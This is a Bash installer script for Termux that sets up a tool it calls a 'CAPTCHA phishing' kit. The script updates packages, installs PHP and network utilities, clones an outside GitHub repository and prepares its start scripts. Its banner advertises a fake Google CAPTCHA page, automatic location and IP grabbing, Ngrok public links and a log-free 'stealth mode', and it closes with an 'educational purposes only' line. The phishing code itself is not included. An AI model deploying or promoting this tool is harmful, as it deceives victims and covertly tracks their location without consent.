#!/bin/bash
clear
echo ""
echo "╔══════════════════════════════════════════╗"
echo "║   NAZ-HUB CAPTCHA PHISHING INSTALLER    ║"
echo "║     Google CAPTCHA Location Grabber     ║"
echo "╚══════════════════════════════════════════╝"
echo ""

# Cek Termux
if [ ! -d "/data/data/com.termux/files/home" ]; then
    echo "❌ This tool only works on Termux!"
    echo "📱 Please install Termux from Play Store first."
    exit 1
fi

echo "[+] Updating packages..."
pkg update -y && pkg upgrade -y

echo "[+] Installing requirements..."
pkg install -y php curl wget git nano

echo "[+] Downloading NAZ-HUB CAPTCHA Tool..."
git clone https://github.com/CrNazamOfficial/Free-Cuy
cd Free-Cuy

echo "[+] Setting up permissions..."
chmod +x start.sh setup.sh

echo ""
echo "══════════════════════════════════════════════"
echo "✅ INSTALLATION COMPLETE!"
echo "══════════════════════════════════════════════"
echo ""
echo "📁 Folder: ~/Free-Cuy"
echo "🚀 Run: cd Free-Cuy && bash start.sh"
echo ""
echo "📌 Features:"
echo "   • Google CAPTCHA phishing page"
echo "   • Auto location grabber"
echo "   • Ngrok public URLs"
echo "   • Stealth mode (no PHP logs)"
echo "   • Auto IP geolocation"
echo ""
echo "⚠️ For educational purposes only!"
echo "══════════════════════════════════════════════"
echo ""
